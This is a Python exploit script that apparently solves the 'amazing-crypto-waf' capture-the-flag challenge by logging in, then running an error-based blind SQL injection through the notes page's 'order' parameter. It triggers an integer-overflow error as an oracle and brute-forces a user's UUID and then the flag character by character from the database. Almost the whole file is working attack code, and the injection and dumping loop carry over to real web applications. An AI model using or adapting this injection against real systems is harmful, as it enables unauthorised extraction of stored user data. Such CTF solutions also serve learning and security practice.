import requests
from urllib.parse import quote_plus
from logzero import logger
s = requests.Session()

DOMAIN = 'https://7b000000b33bd1934bb5647e-amazing-crypto-waf.challenge.broker.allesctf.net:31337'
DOMAIN = 'https://7b0000001d9e04b064368996-amazing-crypto-waf.challenge.master.allesctf.net:31337'
DOMAIN = 'https://7b00000094d41ab01b04b286-amazing-crypto-waf.challenge.master.allesctf.net:31337'

r = s.post(f'{DOMAIN}/registerlogin',
                data={'username': 'liveoverflow','password':'xxxx'}, allow_redirects=False)

# add one note so SQL query succeeds
s.post(f'{DOMAIN}/add_note',
                data={'body': 'pwn', 'title':'flag'}, allow_redirects=False)

def sqli(table, col, test, where):
    sqlinjection=f""",(abs((select IIF(substr({col},1,{len(test)})='{test}', -9223372036854775808, 1) from {table} {where})))--"""
    
    query=f'?order={quote_plus(sqlinjection)}'
    url = f'{DOMAIN}/notes{quote_plus(query)}'
    #logger.warning(url)
    r = s.get(url, allow_redirects=False)
    return r.content

def dump(table, col, where, start='',alphabet='0123456789abcdef'):
    data = start
    new_data = True
    while new_data:
        #logger.info(data)
        new_data = False
        for c in alphabet:
            logger.info(data+c)
            if sqli(table, col, data+c, where) == b'error':
                new_data=True
                data += c
                break;
    return data
                
uuid = dump('users', 'uuid', "WHERE username='flagger' LIMIT 1", alphabet='0123456789abcdef')
#uuid = 'be42bbf7d15d4cbe83dcff7bfc07c556'
logger.info(uuid)
if not uuid:
    exit(0)

flag = ''
flag = dump('notes', 'body', f"WHERE user='{uuid}'", start=flag,alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz{}:')
logger.info(flag)

r = s.post(f'{DOMAIN}/delete_note', data={'uuid':flag}, allow_redirects=False)
logger.info(r.content)
